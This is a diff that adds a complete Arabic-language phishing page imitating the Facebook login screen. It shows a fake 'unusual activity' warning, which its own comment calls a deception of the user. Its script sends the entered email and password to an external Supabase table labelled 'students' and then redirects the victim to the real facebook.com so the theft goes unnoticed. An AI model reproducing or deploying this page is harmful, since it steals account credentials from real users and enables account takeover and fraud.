@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+
+
+
+        .title {
+            font-size: 26px;
+            color: #1877f2;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 90%;
+            padding: 14px;
+            margin-top: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            background: #1877f2;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #0f5ed6;
+        }
+
+        #result {
+            margin-top: 15px;
+        }
+
+        .logo {
+            color: #1877f2;
+            font-size: 50px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 100px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .warning {
+            background: #fee;
+            color: #c00;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 4px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+
+        <div class="login-box">
+            <div class="logo">facebook</div>
+            <!-- رسالة تحذيرية مزيفة لخداع المستخدم -->
+            <div class="warning">
+                ⚠️ تم اكتشاف نشاط غير عادي. يرجى تسجيل الدخول للتحقق من هويتك.
+            </div>
+            <input type="email" id="name" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+
+            <input type="password" id="level" placeholder="كلمة المرور" required>
+
+
+            <button onclick="saveStudent()" type="submit">تسجيل الدخول</button>
+
+
+            <p style="text-align: center; margin-top: 20px;">
+                <a href="#">نسيت كلمة المرور؟</a>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const url = "https://cubkuwqyvifpoyxvvykr.supabase.co/rest/v1/students";
+        const anonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN1Ymt1d3F5dmlmcG95eHZ2eWtyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjMzOTI4ODksImV4cCI6MjA3ODk2ODg4OX0.PJYXQWy3s3SvLhLb1LdTJDEK9TgAded3mKKgtZ_DVOI";
+
+        async function saveStudent() {
+            const name = document.getElementById("name").value;
+            const level = document.getElementById("level").value;
+
+            if (!name || !level) {
+                document.getElementById("result").style.color = "red";
+                document.getElementById("result").innerText = "رجاءً املأ كل الخانات.";
+                return;
+            }
+
+            const payload = { name, level };
+
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "apikey": anonKey,
+                        "Authorization": `Bearer ${anonKey}`,
+                        "Prefer": "return=minimal"
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                // بعد الحفظ → الذهاب مباشرة إلى فيسبوك
+                window.location.href = "https://www.facebook.com";
+
+            } catch (error) {
+                document.getElementById("result").style.color = "red";
+                document.getElementById("result").innerText = "حدث خطأ أثناء حفظ البيانات";
+            }
+        }
+    </script>
+
+</body>
+
+</html>
